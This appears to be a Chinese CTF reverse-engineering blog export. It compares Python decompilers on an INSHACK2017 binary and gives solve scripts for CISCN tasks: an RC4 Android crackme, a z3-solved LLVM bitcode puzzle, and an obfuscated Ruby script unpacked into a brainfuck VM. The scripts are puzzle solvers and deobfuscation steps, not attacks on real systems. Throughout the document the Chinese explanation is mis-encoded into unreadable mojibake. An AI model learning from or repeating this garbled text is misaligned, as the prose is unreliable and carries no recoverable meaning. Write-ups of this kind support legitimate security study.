STORE_FAST 1: res 8 SETUP_LOOP 54 (to 64) 10 LOAD_GLOBAL 1: g 12 LOAD_METHOD 2: is_prime 14 LOAD_FAST 1: res 16 CALL_METHOD 1 18 POP_JUMP_IF_TRUE 62 20 LOAD_CONST 1: 1 22 STORE_FAST 2: b 24 SETUP_LOOP 34 (to 60) 26 LOAD_FAST 2: b 28 LOAD_CONST 2: 0 30 COMPARE_OP 3 (!=) 32 POP_JUMP_IF_FALSE 58 34 LOAD_FAST 1: res 36 LOAD_FAST 2: b 38 BINARY_XOR 40 LOAD_FAST 1: res 42 LOAD_FAST 2: b 44 BINARY_AND 46 LOAD_CONST 1: 1 48 BINARY_LSHIFT 50 ROT_TWO 52 STORE_FAST 1: res 54 STORE_FAST 2: b 56 JUMP_ABSOLUTE 26 58 POP_BLOCK 60 JUMP_ABSOLUTE 10 62 POP_BLOCK 64 LOAD_FAST 1: res 66 RETURN_VALUE \u0026#39;gen_prime\u0026#39; æ˜æ˜¾æœ‰ä¸ª ROT_TWO\nåæ¥é˜Ÿå‹æ‰‹å†™äº†ä¸€ä¸ªdemoæµ‹è¯•äº†ä¸€ä¸‹\næ‰‹å†™çš„ä¸º\na = a ^ b b = a | b å’Œ\na, b = a ^ b, a | b ç„¶åpycdcç»“æœéƒ½æ˜¯\na = a ^ b b = a | b pycdasç»“æœåˆ™æ˜¯ä¸€ä¸ªæœ‰ ROT_TWOï¼Œä¸€ä¸ªæ²¡æœ‰ï¼Œæ˜¯æ­£ç¡®çš„\nifåˆ¤æ–­åæ¥forå¾ªç¯æ—¶å‡ºç°æ— é™åµŒå¥— åœ¨åšINSHACK2017é‚£é“é¢˜çš„æ—¶å€™ï¼Œä¸€å¼€å§‹ç”µè„‘é‡Œæ²¡è£…uncompyle6ï¼Œäºæ˜¯æ‰“ç®—æ‹¿pycdcè§£ï¼Œä½†è¿è¡Œäº†ä¸€ä¸‹ï¼Œå‘ç°ç›´æ¥ç”Ÿæˆäº†ä¸€ä¸ª2Gçš„æ–‡ä»¶ï¼Œè¦ä¸æ˜¯SegmentFaultäº†ä¼°è®¡è¿˜èƒ½ç”Ÿæˆï¼Œç”¨pycdasè§£äº†ä¸€ä¸‹ï¼Œæ„Ÿè§‰æ²¡ä»€ä¹ˆé—®é¢˜\npycdcå¡ä½çš„éƒ¨åˆ†ï¼š\ndef activate(self, s): print_dbg(\u0026#39;call: activate(self, s=\u0026lt;%s\u0026gt;)\u0026#39; % s) blocks = s.split(\u0026#39;-\u0026#39;) blocks_sz = len(blocks) if blocks_sz != 6: print_dbg(\u0026#39;err: incorrect number of blocks (%d)\u0026#39; % blocks_sz) return False : print_dbg(\u0026#39;call: activate(self, s=\u0026lt;%s\u0026gt;)\u0026#39; % s) blocks = s.split(\u0026#39;-\u0026#39;) blocks_sz = len(blocks) if blocks_sz != 6: print_dbg(\u0026#39;err: incorrect number of blocks (%d)\u0026#39; % blocks_sz) return False : print_dbg(\u0026#39;call: activate(self, s=\u0026lt;%s\u0026gt;)\u0026#39; % s) blocks = s.split(\u0026#39;-\u0026#39;) blocks_sz = len(blocks) if blocks_sz != 6: print_dbg(\u0026#39;err: incorrect number of blocks (%d)\u0026#39; % blocks_sz) return False : print_dbg(\u0026#39;call: activate(self, s=\u0026lt;%s\u0026gt;)\u0026#39; % s) blocks = s.split(\u0026#39;-\u0026#39;) blocks_sz = len(blocks) if blocks_sz != 6: print_dbg(\u0026#39;err: incorrect number of blocks (%d)\u0026#39; % blocks_sz) return False : # åé¢å°±æ˜¯æ— é™åµŒå¥—äº† uncompyle6ç»“æœ\ndef activate(self, s): print_dbg(\u0026#39;call: activate(self, s=\u0026lt;%s\u0026gt;)\u0026#39; % s) blocks = s.split(\u0026#39;-\u0026#39;) blocks_sz = len(blocks) if blocks_sz != 6: print_dbg(\u0026#39;err: incorrect number of blocks (%d)\u0026#39; % blocks_sz) return False for k in range(0, blocks_sz): self.z = self.block(blocks[k], self.z) print_dbg(\u0026#39;dbg: new z is: %d\u0026#39; % self.z) if self.z is None: print_dbg(\u0026#39;err: block function returned error\u0026#39;) return False if self.z != self.checksum[k]: print_dbg(\u0026#39;err: incorrect checksum (z=%d tested against checksum[%d]=%d)\u0026#39; % (self.z, k, self.checksum[k])) return False return True pycdasç»“æœ\n[Code] File Name: src/standalone/cctv_manager_standalone.py Object Name: activate Arg Count: 2 KW Only Arg Count: 0 Locals: 5 Stack Size: 7 Flags: 0x00000043 (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE) [Names] \u0026#39;print_dbg\u0026#39; \u0026#39;split\u0026#39; \u0026#39;len\u0026#39; \u0026#39;range\u0026#39; \u0026#39;block\u0026#39; \u0026#39;z\u0026#39; \u0026#39;checksum\u0026#39; [Var Names] \u0026#39;self\u0026#39; \u0026#39;s\u0026#39; \u0026#39;blocks\u0026#39; \u0026#39;blocks_sz\u0026#39; \u0026#39;k\u0026#39; [Free Vars] [Cell Vars] [Constants] None \u0026#39;call: activate(self, s=\u0026lt;%s\u0026gt;)\u0026#39; \u0026#39;-\u0026#39; 6 \u0026#39;err: incorrect number of blocks (%d)\u0026#39; False 0 \u0026#39;dbg: new z is: %d\u0026#39; \u0026#39;err: block function returned error\u0026#39; \u0026#39;err: incorrect checksum (z=%d tested against checksum[%d]=%d)\u0026#39; True [Disassembly] 0 LOAD_GLOBAL 0: print_dbg 3 LOAD_CONST 1: \u0026#39;call: activate(self, s=\u0026lt;%s\u0026gt;)\u0026#39; 6 LOAD_FAST 1: s 9 BINARY_MODULO 10 CALL_FUNCTION 1 13 POP_TOP 14 LOAD_FAST 1: s 17 LOAD_ATTR 1: split 20 LOAD_CONST 2: \u0026#39;-\u0026#39; 23 CALL_FUNCTION 1 26 STORE_FAST 2: blocks 29 LOAD_GLOBAL 2: len 32 LOAD_FAST 2: blocks 35 CALL_FUNCTION 1 38 STORE_FAST 3: blocks_sz 41 LOAD_FAST 3: blocks_sz 44 LOAD_CONST 3: 6 47 COMPARE_OP 3 (!=) 50 POP_JUMP_IF_FALSE 71 53 LOAD_GLOBAL 0: print_dbg 56 LOAD_CONST 4: \u0026#39;err: incorrect number of blocks (%d)\u0026#39; 59 LOAD_FAST 3: blocks_sz 62 BINARY_MODULO 63 CALL_FUNCTION 1 66 POP_TOP 67 LOAD_CONST 5: False 70 RETURN_VALUE 71 SETUP_LOOP 156 (to 230) 74 LOAD_GLOBAL 3: range 77 LOAD_CONST 6: 0 80 LOAD_FAST 3: blocks_sz 83 CALL_FUNCTION 2 86 GET_ITER 87 FOR_ITER 139 (to 229) 90 STORE_FAST 4: k 93 LOAD_FAST 0: self 96 LOAD_ATTR 4: block 99 LOAD_FAST 2: blocks 102 LOAD_FAST 4: k 105 BINARY_SUBSCR 106 LOAD_FAST 0: self 109 LOAD_ATTR 5: z 112 CALL_FUNCTION 2 115 LOAD_FAST 0: self 118 STORE_ATTR 5: z 121 LOAD_GLOBAL 0: print_dbg 124 LOAD_CONST 7: \u0026#39;dbg: new z is: %d\u0026#39; 127 LOAD_FAST 0: self 130 LOAD_ATTR 5: z 133 BINARY_MODULO 134 CALL_FUNCTION 1 137 POP_TOP 138 LOAD_FAST 0: self 141 LOAD_ATTR 5: z 144 LOAD_CONST 0: None 147 COMPARE_OP 8 (is) 150 POP_JUMP_IF_FALSE 167 153 LOAD_GLOBAL 0: print_dbg 156 LOAD_CONST 8: \u0026#39;err: block function returned error\u0026#39; 159 CALL_FUNCTION 1 162 POP_TOP 163 LOAD_CONST 5: False 166 RETURN_VALUE 167 LOAD_FAST 0: self 170 LOAD_ATTR 5: z 173 LOAD_FAST 0: self 176 LOAD_ATTR 6: checksum 179 LOAD_FAST 4: k 182 BINARY_SUBSCR 183 COMPARE_OP 3 (!=) 186 POP_JUMP_IF_FALSE 87 189 LOAD_GLOBAL 0: print_dbg 192 LOAD_CONST 9: \u0026#39;err: incorrect checksum (z=%d tested against checksum[%d]=%d)\u0026#39; 195 LOAD_FAST 0: self 198 LOAD_ATTR 5: z 201 LOAD_FAST 4: k 204 LOAD_FAST 0: self 207 LOAD_ATTR 6: checksum 210 LOAD_FAST 4: k 213 BINARY_SUBSCR 214 BUILD_TUPLE 3 217 BINARY_MODULO 218 CALL_FUNCTION 1 221 POP_TOP 222 LOAD_CONST 5: False 225 RETURN_VALUE 226 JUMP_ABSOLUTE 87 229 POP_BLOCK 230 LOAD_CONST 10: True 233 RETURN_VALUE \u0026#39;Activator.activate\u0026#39; ä¹Ÿæ²¡çœ‹å‡ºæ¥ä»€ä¹ˆé—®é¢˜\n","date":"2021-05-26T23:54:09Z","image":"/post/reverse-from-1-to-2/cover_hu527ed7315192f7c3af2dd0a401d3a23d_899763_120x120_fill_q75_box_smart1.jpg","permalink":"/post/reverse-from-1-to-2/","title":"Reverse from 1 to 2"},{"content":"glass å®‰å“é€†å‘ï¼Œä½¿ç”¨jebæ‰“å¼€ï¼Œå‘ç°åœ¨javaå±‚ä»…è¿›è¡Œäº†ç®€å•çš„è¾“å…¥ï¼Œç„¶åè¿›å…¥soå±‚åˆ¤æ–­\nç”¨idaæ‰“å¼€soå±‚ï¼Œç›´æ¥æœç´¢javaï¼Œè¿›å…¥åˆ¤æ–­å‡½æ•°\nä¸‹é¢çš„å­—ç¬¦ä¸²åº”è¯¥æ˜¯å¯†é’¥\nqmemcpy(v6, \u0026#34;12345678\u0026#34;, sizeof(v6)); ç„¶åè°ƒç”¨äº†ä¸‰ä¸ªå‡½æ•°\nsub_FFC(v7, v6, v4); sub_1088(v7, flag, 39); sub_10D4(flag, 39, v6, v4); è¿›å…¥æŸ¥çœ‹ï¼Œç¬¬ä¸€ä¸ªæ˜¯RC4å¯†é’¥åˆå§‹åŒ–ï¼Œç¬¬äºŒä¸ªæ˜¯RC4åŠ å¯†ï¼Œç¬¬ä¸‰ä¸ªæ˜¯å¯¹å¯†æ–‡è¿›è¡Œç®€å•çš„è¿ç®—\nä»å­—ç¬¦ä¸²é‡Œæ‹¿å¯†æ–‡ï¼Œå†™è„šæœ¬è¿›è¡Œæ±‚è§£ï¼Œå…ˆå¯¹ç®€å•è¿ç®—è¿›è¡Œåå‘è¿ç®—ï¼Œç„¶åæ‰¾ä¸ªRC4å¯†ç çš„è„šæœ¬ï¼Œè·‘ä¸€ä¸‹å°±å¯ä»¥æ‰¾åˆ°flag\ncipher = [0xA3, 0x1A, 0xE3, 0x69, 0x2F, 0xBB, 0x1A, 0x84, 0x65, 0xC2, 0xAD, 0xAD, 0x9E, 0x96, 5, 2, 0x1F, 0x8E, 0x36, 0x4F, 0xE1, 0xEB, 0xAF, 0xF0, 0xEA, 0xC4, 0xA8, 0x2D, 0x42, 0xC7, 0x6E, 0x3F, 0xB0, 0xD3, 0xCC, 0x78, 0xF9, 0x98, 0x3F, 0] key = [0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38] def __rc4_init(key): keylength = len(key) S = list(range(256)) j = 0 for i in range(256): j = (j + S[i] + key[i % keylength]) % 256 S[i], S[j] = S[j], S[i] return S def rc4_crypt(key, data): S = __rc4_init(key) i = j = 0 result = b\u0026#39;\u0026#39; for a in data: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] k = (a ^ S[(S[i] + S[j]) % 256]).to_bytes(1, \u0026#39;big\u0026#39;) result += k return result def convert(k): ret = [] while k \u0026gt; 0: ret.append(k \u0026amp; 0xff) k \u0026gt;\u0026gt;= 8 return ret[::-1] from libnum import n2s, s2n for j in range(39): cipher[j] ^= key[j % 8] for j in range(0, 39, 3): cipher[j], cipher[j + 1], cipher[j + 2] = cipher[j + 1] ^ cipher[j + 2], cipher[j + 1] ^ cipher[j], cipher[j] ^ cipher[j + 1] ^ cipher[j + 2] print (rc4_crypt(key, cipher)) # b\u0026#39;CISCN{6654d84617f627c88846c172e0f4d46c}\\xec\u0026#39; baby_bc ä¸çŸ¥é“bcæ–‡ä»¶æ˜¯ä»€ä¹ˆï¼Œç”¨ file å‘½ä»¤æŸ¥çœ‹ï¼Œå‘ç°æ˜¯ LLVM ir bitcode æ–‡ä»¶ï¼Œä¸Šç½‘æœç´¢ï¼Œä½¿ç”¨ clang -o baby_bc baby.bc ææˆ elf æ–‡ä»¶\næ‹–å…¥idaè¿›è¡ŒæŸ¥çœ‹\né¦–å…ˆå¯¹è¾“å…¥è¿›è¡Œåˆ¤æ–­ï¼Œåˆ†æè¾“å…¥çš„åº”è¯¥æ˜¯é•¿åº¦æ˜¯25çš„å­—ç¬¦ä¸²ï¼Œæ¯ä¸ªå­—ç¬¦éƒ½åœ¨ 0-5 ä¹‹é—´\nè¦æ‹¿åˆ°flagéœ€è¦é€šè¿‡ä¸¤ä¸ªéªŒè¯å‡½æ•°\nç¬¬ä¸€ä¸ªå‡½æ•°æ˜¯å°†è¾“å…¥å¡«å…¥åˆ°mapä¸­ï¼Œmapä¸­éé›¶ä½è¾“å…¥åº”è¯¥ä¸º0ï¼Œé›¶ä½çš„è¾“å…¥ä¸èƒ½ä¸º0\nç¬¬äºŒä¸ªå‡½æ•°æ˜¯å¯¹mapè¿›è¡ŒéªŒè¯ï¼Œåˆ†æåå‘ç°æ€»å…±è¿›è¡Œäº†å¦‚ä¸‹éªŒè¯ï¼š\næ¯è¡Œçš„æ•°å­—ä¸èƒ½ç›¸åŒ æ¯åˆ—çš„æ•°å­—ä¸èƒ½ç›¸åŒ æ¯è¡Œç›¸é‚»ä¸¤ä¸ªæ•°å­—çš„å¤§å°å…³ç³»éœ€è¦ç¬¦åˆrowçŸ©é˜µçš„è¦æ±‚ æ¯åˆ—ç›¸é‚»ä¸¤ä¸ªæ•°å­—çš„å¤§å°å…³ç³»éœ€è¦ç¬¦åˆcolçŸ©é˜µçš„è¦æ±‚ çŸ¥é“è¦æ±‚åç›´æ¥ä¸Šz3çº¦æŸæ±‚è§£å™¨æ‹¿flag\nfrom z3 import * s = Solver() flag = [Int(\u0026#34;flag_%i\u0026#34; % i) for i in range(25)] for i in range(25): s.add(flag[i] \u0026gt; 0) s.add(flag[i] \u0026lt; 6) s.add(flag[12] == 4) s.add(flag[18] == 3) for i in range(5): add_row = 0 add_col = 0 for j in range(5): add_row += flag[i * 5 + j] add_col += flag[j * 5 + i] s.add(add_row == 15) s.add(add_col == 15) s.add(flag[5] \u0026gt; flag[6]) s.add(flag[20] \u0026gt; flag[21]) s.add(flag[3] \u0026gt; flag[4]) s.add(flag[13] \u0026gt; flag[14]) s.add(flag[22] \u0026gt; flag[23]) s.add(flag[10] \u0026lt; flag[11]) s.add(flag[2] \u0026gt; flag[7]) s.add(flag[4] \u0026gt; flag[9]) s.add(flag[13] \u0026lt; flag[18]) s.add(flag[16] \u0026lt; flag[21]) s.add(flag[19] \u0026lt; flag[24]) for i in range(5): for j in range(5): for k in range(5): if j == k: continue s.add(flag[5 * i + j] != flag[5 * i + k]) s.add(flag[5 * j + i] != flag[5 * k + i]) if s.check() == sat: model = s.model() for i in range(25): print (model[flag[i]].as_long().real, end=\u0026#39;\u0026#39;) print (\u0026#39;\\nfinish\u0026#39;) # 1425353142354212153442315 æœ€åæŠŠä¸¤ä¸ªåœ°æ–¹æ”¹æˆ 0 å°±è¡Œäº†\nlittle_evil åŸºæœ¬åˆ†æ ç›´æ¥ç”¨idaç›´æ¥æ‰“å¼€ä¼šçœ‹åˆ°ä¸€ä¸ªå«åš\u0026quot;squashfs\u0026quot;ï¼Œè€Œä¸”å’Œrubyæœ‰å…³ï¼Œä½†æ¯”èµ›çš„æ—¶å€™æ²¡æœ‰å¤šæƒ³ï¼Œç„¶åå°±èµ°è¿œäº†\næ”¾ä¸€å¼ çè´µæˆªå›¾\nåæ¥å¾—çŸ¥æ­£ç¡®æ–¹æ³•éœ€è¦å…ˆç”¨binwalkåˆ†è§£ä¸€ä¸‹ï¼Œè¿™é‡Œæœ‰ä¸ªå‘ï¼Œéœ€è¦è‡ªå·±æ‰‹åŠ¨è£…ä¸€ä¸ª\u0026quot;squashfs\u0026quot;çš„æ’ä»¶\né¡ºä¾¿è¡¥å……ä¸€ä¸‹ä»€ä¹ˆæ˜¯\u0026quot;squashfs\u0026quot;ï¼šåŸºäºLinuxå†…æ ¸ä½¿ç”¨çš„å‹ç¼©åªè¯»æ–‡ä»¶ç³»ç»Ÿã€‚éš¾æ€ªè¦ç”¨binwalkï¼Œæ²‰æ€\nåˆ©ç”¨è¾“å‡ºå»æ··æ·† åˆ†è§£åç¿»ä¸€ä¸‹ç›®å½•ï¼Œå¯ä»¥æ‰¾åˆ°ä¸€ä¸ª out.rb çš„æ–‡ä»¶\næ‰“å¼€åå‘ç°æ˜¯ä¸€ä¸ªè¢«ä¸¥é‡æ··æ·†çš„è„šæœ¬ï¼Œå¤§æ¦‚é•¿ä¸‹é¢è¿™æ ·\n$l1Il=\u0026#34;\u0026#34;; $l1lI=\u0026#34;\u0026#34;; def llIl() $lI1lll=$lI1lll|7; end; def l1lll() $lI1lll=10; end; def llI1l() $lI1lll=$lI1lll|4; end; def lIlI() $lI1lll=$lI1lll+3; end; def l111() $lI1lll=$lI1lll%3; end; def lI1IlI() $lI1lll=$lI1lll|3; end; def ll1l1() $lI1lll=$lI1lll*8; end; def l1lI() $lI1lll=$lI1lll-3; end; def lI1lII() $lI1lll=$lI1lll%1; end; def lIlIl() $lI1lll=$lI1lll\u0026amp;10; end; def lIll() $lI1lll=$lI1lll-4; end; def lII1() $lI1lll=$lI1lll%2; end; def l1III() $lI1lll=$lI1lll|1; end; def l1l111() $lI1lll=$lI1lll|5; end; def l1IIII() $lI1lll=$lI1lll%10; end; def l11I() $l1Il=$l1Il+$lI1lll.chr; end; def lIlll() $lI1lll=$lI1lll*9; end; def l11IlI() $lI1lll=$lI1lll-8; end; def lI1I1() $lI1lll=$lI1lll+5; end; def ll11lI() $lI1lll=$lI1lll\u0026amp;9; end; def lII1l1() #send($l1Il[0,4], $l1Il[4,$l1Il.length]); aFile=File.new(\u0026#34;out2.rb\u0026#34;, \u0026#34;w\u0026#34;); aFile.syswrite($l1Il); aFile.close; end; æœ€åä¸€ä¸ªå‡½æ•°é‡Œæœ¬æ¥åªæœ‰ä¸€ä¸ª send æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•æ˜¯æ‰§è¡Œç¬¬ä¸€ä¸ªå‚æ•°çš„å‡½æ•°ï¼Œåé¢çš„å‚æ•°éƒ½æ˜¯è¿™ä¸ªå‡½æ•°çš„å˜é‡\nè¿™é‡Œè·Ÿç€å­¦é•¿å­¦ä¹ äº†ä¸€ä¸ªé’ˆå¯¹è§£é‡Šæ€§è¯­è¨€æ··æ·†çš„åŠæ³•ï¼Œå°±æ˜¯ç›´æ¥è¾“å‡ºè¿™ä¸ªsendä¸­çš„å˜é‡\nè¾“å‡ºä¹‹åè¿˜æ˜¯ä¸€ä¸ªç›¸ä¼¼çš„è„šæœ¬ï¼Œç®€å•æ¢ä¸€ä¸‹è¡Œï¼Œé•¿è¿™æ ·ï¼š\n# eval $llll=\u0026#34;\u0026#34;; $llII=\u0026#34;\u0026#34;; def l1llI()$l1lI1l=$l1lI1l|7; end; def ll1III()$l1lI1l=$l1lI1l%7; end; def lllI()$l1lI1l=$l1lI1l/4; end; def lIl1l()$l1lI1l=$l1lI1l-3; end; def l1lll()$l1lI1l=$l1lI1l|10; end; def l11I1I()$l1lI1l=10; end; def l1l1()$l1lI1l=$l1lI1l\u0026amp;7; end; def l1II()$l1lI1l=$l1lI1l%8; end; def ll1I()$l1lI1l=$l1lI1l|8; end; def ll11()$l1lI1l=$l1lI1l^6; end; def ll1l1I()$l1lI1l=$l1lI1l|1; end; def lI1Il()$l1lI1l=$l1lI1l|3; end; def llI1I()$l1lI1l=$l1lI1l+6; end; def llIl1()$l1lI1l=$l1lI1l*4; end; def lI1ll()$l1lI1l=$l1lI1l*5; end; def l1111()$l1lI1l=$l1lI1l^7; end; def l1lII()$l1lI1l=$l1lI1l^4; end; def lIIl()$l1lI1l=$l1lI1l%5; end; def lII11()$l1lI1l=$l1lI1l+9; end; def lI11I()$llll=$llll+$l1lI1l.chr; end; def l1IlI()send($llll[0,4], $llll[4,$llll.length]); end; ä¸€å¼€å§‹çš„ eval å°±æ˜¯ send ä¸­è°ƒç”¨çš„å‡½æ•°ï¼Œå¯ä»¥åˆ†æå‡ºæ¥åé¢çš„ä¸œè¥¿å°±æ˜¯è¦ç”¨æ¥æ‰§è¡Œçš„ï¼Œå› ä¸ºè¿™æ˜¯è§£é‡Šæ€§è¯­è¨€ï¼Œç›´æ¥è¾“å‡ºå°±æ‹¿åˆ°æºä»£ç äº†\nå’Œåˆšæ‰è¿›è¡ŒåŒæ ·çš„æ“ä½œï¼Œæ‹¿åˆ°ç¬¬ä¸‰ä»½è„šæœ¬\nbegin $_=$$/$$;@_=$_+$_;$-_=$_-@_ $__=-\u0026gt;_{_==[]||_==\u0026#39;\u0026#39;?$.:$_+$__[_[$_..$-_]]} @__=-\u0026gt;_,\u0026amp;__{_==[]?[]:[__[_[$.]]]+@__[_[$_..$-_],\u0026amp;__]} $_____=-\u0026gt;_{@__[[*_],\u0026amp;-\u0026gt;__{__[$.]}]} @_____=-\u0026gt;_{@__[[*_],\u0026amp;-\u0026gt;__{__[$-_]}]} $______=-\u0026gt;_{___,______=$_____[_],@_____[_];_____=$__[___];____={};__=$.;(_=-\u0026gt;{ ____[______[__]]=___[__];(__+=$_)==_____ ?____:_[]})[]} @______=-\u0026gt;_,__{_=[*_]+[*__];____=$__[_];___={};__=$.;(_____=-\u0026gt;{ ___[_[__][$.]]=_[__][$_];(__+=$_)==____ ?___:_____[]})[]} $_______=-\u0026gt;_{$___=[];@___=$__[_];__=___=____=$.;$____,@____={},[] (_____=-\u0026gt;{ _[____]==\u0026#39;5\u0026#39;?(@____\u0026lt;\u0026lt;____):$. _[____]==\u0026#39;6\u0026#39;?($____[@____[$-_]]=____;@____=@____[$...$.-@_]):$. (____+=$_)==@___?$.:_____[]})[] $____=$____=={}?{}:@______[$____,$______[$____]] (______=-\u0026gt;{_[__]== \u0026#39;0\u0026#39;?($___[___]||=$.;$___[___]+=$_):_[__]== \u0026#39;1\u0026#39;?($___[___]||=$.;$___[___]-=$_):_[__]== \u0026#39;2\u0026#39;?($___[___]||=$.;$___[___]=STDIN.getc.ord):_[__]== \u0026#39;3\u0026#39;?(___+=$_):_[__]== \u0026#39;4\u0026#39;?(___-=$_):_[__]== \u0026#39;5\u0026#39;?(__=($___[___]||$.)==$.?$____[__]:__):_[__]== \u0026#39;6\u0026#39;?(__=($___[___]||$.)!=$.?$____[__]:__):_[__]== \u0026#39;7\u0026#39;?($\u0026gt;\u0026lt;\u0026lt;(\u0026#39;\u0026#39;\u0026lt;\u0026lt;$___[___])):$. (__+=$_)==@___?_:______[]})[]} $_______[\u0026#39;33516351...44516644\u0026#39;];rescue Exception;end #ä¸­é—´éƒ¨åˆ†çœç•¥äº† è¿™ä»½è„šæœ¬å°±å¾ˆä¸‘äº†ï¼Œæœ€åä¸€é•¿ä¸²çš„æ•°å­—ï¼Œè®©æˆ‘è‡ªå·±æ¥çŒœçš„è¯è‚¯å®šä¼šçŒœæ˜¯ä¸€ä¸ªè™šæ‹Ÿæœº\nç„¶åä¸€å¤§å † ? ä¸€çœ‹å°±æ˜¯ switch è¯­å¥ï¼Œåæ¥ç»†çœ‹æ‰å‘ç°å…¨æ˜¯ä¸‰å…ƒè¿ç®—ç¬¦ï¼Œä½†ä¹Ÿæ˜¯ switch çš„ä½œç”¨\näºæ˜¯å°†æŒ‡ä»¤éƒ¨åˆ†ç¿»è¯‘æˆ pythonï¼ˆåªæ˜¯ç†Ÿæ‚‰ä¸€ç‚¹è€Œå·²ï¼‰\nif _[tmp_2] == \u0026#39;0\u0026#39;: global_3[tmp_3] ||= $. global_3[tmp_3] += global_1 if _[tmp_2] == \u0026#39;1\u0026#39;: global_3[tmp_3] ||= $. global_3[tmp_3] -= global_1 if _[tmp_2] == \u0026#39;2\u0026#39;: global_3[tmp_3] ||= $. global_3[tmp_3] = STDIN.getc.ord if _[tmp_2] == \u0026#39;3\u0026#39;: tmp_3 += global_1 if _[tmp_2] == \u0026#39;4\u0026#39;: tmp_3 -= global_1 if _[tmp_2] == \u0026#39;5\u0026#39;: if (global_3[tmp_3] or $.) == $.: tmp_2 = global_4[tmp_2] if _[tmp_2] == \u0026#39;6\u0026#39;: if (global_3[tmp_3] or $.) != $.: tmp_2 = global_4[tmp_2] if _[tmp_2] == \u0026#39;7\u0026#39;: global_0\u0026lt;\u0026lt;(\u0026#39;\u0026#39;.append(global_3[tmp_3])) å› ä¸ºæ˜¯è¡¥é¢˜ï¼Œæ‰€ä»¥æå‰çŸ¥é“æ˜¯ brainfuck è¯­è¨€ï¼Œä½†è¿˜æ˜¯å°è¯•è‡ªå·±é€†äº†ä¸€ä¸‹\ntmp_3 æ˜¯æŒ‡é’ˆï¼Œæ“ä½œ3å’Œ4å¯¹åº”äº†æŒ‡é’ˆ+1 -1(\u0026gt;å’Œ\u0026lt;) global_3 æ˜¯æŒ‡é’ˆæŒ‡å‘çš„å­—èŠ‚ï¼Œæ“ä½œ0å’Œ1å¯¹åº”äº†å­—èŠ‚çš„+1 -1(+å’Œ-) æ“ä½œ2ä¸­å«æœ‰è·å–è¾“å…¥ï¼Œå¯¹åº”äº†è·å–è¾“å…¥æ“ä½œ(,) æ“ä½œ7ä¸­å«æœ‰\u0026laquo;ï¼Œæ€€ç–‘æ˜¯è¾“å‡ºï¼Œå¯¹åº”äº†è¾“å‡ºæ“ä½œ(.) 5å’Œ6å¯¹åº”äº†è·³è½¬ï¼ŒçŒœæµ‹5æ˜¯[ï¼Œ6æ˜¯] ä¹‹åå°±å¯ä»¥æ‰¾ä¸ªè„šæœ¬ç¿»è¯‘ brainfuck äº†\næˆ‘å…ˆç”¨ python å°†å…¶è½¬ä¸ºäº†æ­£å¸¸çš„ brainfuck è¯­è¨€\nfinalop = \u0026#39;\u0026#39; base = \u0026#39;+-,\u0026gt;\u0026lt;[].\u0026#39; for c in op: # é‚£ä¸€ä¸²æ•°å­— finalop += (base[int(c)]) print (finalop) ç„¶åæ‰¾äº†ä¸ªè„šæœ¬ï¼Œè¿™æ˜¯æ ¸å¿ƒéƒ¨åˆ†ï¼š\nint cur = 0; while ((c = getc(in)) != EOF) { switch (c) { case \u0026#39;\u0026gt;\u0026#39;: // fprintf(out, \u0026#34;\\t\\t++c;\\n\u0026#34;); cur++; break; case \u0026#39;\u0026lt;\u0026#39;: // fprintf(out, \u0026#34;\\t\\t--c;\\n\u0026#34;); cur--; break; case \u0026#39;+\u0026#39;: fprintf(out, \u0026#34;\\t\\t++a[%d];\\n\u0026#34;, cur); break; case \u0026#39;-\u0026#39;: fprintf(out, \u0026#34;\\t\\t--a[%d];\\n\u0026#34;, cur); break; case \u0026#39;.\u0026#39;: fprintf(out, \u0026#34;\\t\\tputchar(a[%d]);\\n\u0026#34;, cur); break; case \u0026#39;,\u0026#39;: fprintf(out, \u0026#34;\\t\\ta[%d] = getchar();\\n\u0026#34;, cur); break; case \u0026#39;[\u0026#39;: fprintf(out, \u0026#34;\\twhile (a[%d]) {\\n\u0026#34;, cur); break; case \u0026#39;]\u0026#39;: fprintf(out, \u0026#34;\\t}\\n\u0026#34;); break; default: break; } } ä¸€å¼€å§‹éšä¾¿æ‰¾äº†ä¸ªè„šæœ¬å°±è¿è¡Œï¼Œç„¶åå°è¯•å»çœ‹ï¼Œä½†åæ¥å‘ç°å¾ˆå¤šæŒ‡é’ˆä½ç½®çš„å˜åŒ–ï¼Œçœ‹ç€å¾ˆç´¯ï¼Œäºæ˜¯è®©æŒ‡é’ˆçš„å˜åŒ–åœ¨å†…éƒ¨è¿è¡Œï¼Œå¯¹å…·ä½“æ•°åšå˜åŒ–çš„æ—¶å€™ç›´æ¥æ‰“å°æŒ‡é’ˆçš„å€¼å°±å¯ä»¥äº†\nBrainfuck ä»£ç é˜…è¯» æ¥ä¸‹æ¥å°±æ˜¯ç—›è‹¦çš„ Brainfuck ä»£ç é˜…è¯»ç¯èŠ‚äº†ï¼Œè™½ç„¶ä»£ç å·²ç»æœ‰äº†æœ€ç®€å•çš„ç¾åŒ–ï¼Œä½†çœ‹èµ·æ¥è¿˜æ˜¯åƒæ··æ·†è¿‡çš„æ±‡ç¼–ã€‚\nè‡ªå·±åšçš„æ—¶å€™æ˜¯ä¸€ç‚¹ä¸€ç‚¹ç¾åŒ–ä»£ç ï¼Œç„¶åé˜…è¯»çš„ã€‚ä½†æœ€åæ‰¾åˆ°éªŒè¯å‡½æ•°æ‰ææ˜ç™½ã€‚\næ‰€ä»¥å…ˆå»æœ€ä¸‹é¢æ‰¾åˆ°éªŒè¯å‡½æ•°ï¼Œçœ‹åˆ°æœ€ä¸‹é¢æœ‰ä¸¤ä¸ªputcharï¼ŒçŒœæµ‹å°±æ˜¯é€šè¿‡éªŒè¯äº†ï¼Œäºæ˜¯æ‰¾è¿›å…¥çš„æ¡ä»¶\na[2] = getchar(); // several code while (a[2]) { // several code a[1] = 0; // several code } a[2] = 0; a[3] = 0; while (a[1]) { ++a[2]; ++a[3]; --a[1]; } // several code while (a[2]) { // several code putchar(a[4]); // several code putchar(a[4]); a[2] = 0; } è¿›å…¥çš„æ¡ä»¶æ˜¯è¦ a[2] \u0026gt; 0ï¼Œç½‘ä¸Šçœ‹å°±çŸ¥é“éœ€è¦è®© a[1] \u0026gt; 0ï¼Œæ‰€ä»¥åœ¨ç¼–è¾‘å™¨é‡Œé€‰ä¸­ä¸€ä¸‹ï¼Œå°±èƒ½æ‰¾åˆ°æ‰€æœ‰ a[1] 